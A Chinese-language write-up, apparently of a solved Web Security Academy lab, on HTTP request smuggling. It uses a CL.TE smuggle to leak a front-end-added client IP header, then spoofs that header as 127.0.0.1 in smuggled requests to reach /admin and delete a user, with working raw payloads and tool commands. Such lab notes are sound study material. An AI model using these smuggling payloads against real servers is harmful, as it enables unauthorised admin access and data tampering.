---
title: lab-reveal-front-end-request-rewriting
references:
- key: request-smuggling-family
  title: request-smuggling-family
---

# lab-reveal-front-end-request-rewriting

> evidences: [[request-smuggling-family]]

- 题面:Exploiting HTTP request smuggling to reveal front-end request rewriting(`/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting`)
- 实例:`https://0a1700ea036af32180e1a34a004e00cd.web-security-academy.net`(批次 34,2026-10-06)
- 判定目标:走私揭示前端追加的"客户端 IP"头,再用该头走私 `/admin` 删 carlos;状态:**solved**

## 关键步(件:smuggle_seq / conn_reuse)

1. 搜索面:`POST /` 表单字段 `search`,回显在 `<h1>0 search results for '<term>'</h1>`(未编码,可穿 CRLF)。
2. **揭示前端追加头**:CL.TE 走私一条**未完成**的 `POST /`(body=`search=`,CL 比 body 大 deficit 字节);
   后端等 body,前端随后转发的**下一个请求**(含前端追加的头)被吞进 `search` → 回显。
   - 前端**把自造头放在请求行之后、Host 之前**;实测头名 `X-rZnDJh-Ip: 43.161.248.154`。
   - `smuggle_seq`(新件)自动 sweep deficit 40/60/80/100/110,拼出完整头块。
3. 该头就是 `X-Forwarded-For` 的改名版;直连 `/admin` 若自带同名头 → 前端 `400 Duplicate header names are not allowed`,故必须走走私。
4. **收口**:走私 `GET /admin HTTP/1.1\r\nHost: <lab>\r\nX-rZnDJh-Ip: 127.0.0.1\r\nContent-Length: 15\r\n\r\nx=1`(CL 欠 12 字节)→ 下一个请求拿到 **200 管理面板**(`Cache-Control: no-cache`);同法换 `GET /admin/delete?username=carlos` → **302 Location: /admin**。

## 证据摘录

```
smuggle_seq <lab>/ --smuggle 'POST / HTTP/1.1\r\nHost: <lab>\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\nsearch=' --follow 'GET / HTTP/1.1\r\nHost: <lab>\r\n\r\n' --deficits 40,60,80,100,110
 -> snip: "search results for 'GET / HTTP/1.1\r\nX-rZnDJh-Ip: 43.161.248.154\r\nHost: 0a1700ea0…'"
# 删人:
smuggle_seq <lab>/ --smuggle 'GET /admin/delete?username=carlos HTTP/1.1\r\nHost: <lab>\r\nX-rZnDJh-Ip: 127.0.0.1\r\nContent-Length: 0\r\n\r\nx=' --follow 'GET /?recv=2 HTTP/1.1\r\nHost: <lab>\r\n\r\n' --deficits 12,30
 -> target: HTTP/1.1 302 Found  Location: /admin
solved_check -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 要点

- 头块顺序:**前端自造头在最前**(请求行之后、Host 之前)→ deficit ~40 就能看到头名。
- `smuggle_seq` 的三连接模型(arm / follow / flush)在本 lab 稳定;arm 后**必须用独立连接**补全(同连接前端会 `Connection: close`)。
- 直连自带同名前缀头会被前端判"重复头"400 → 走私是唯一路。
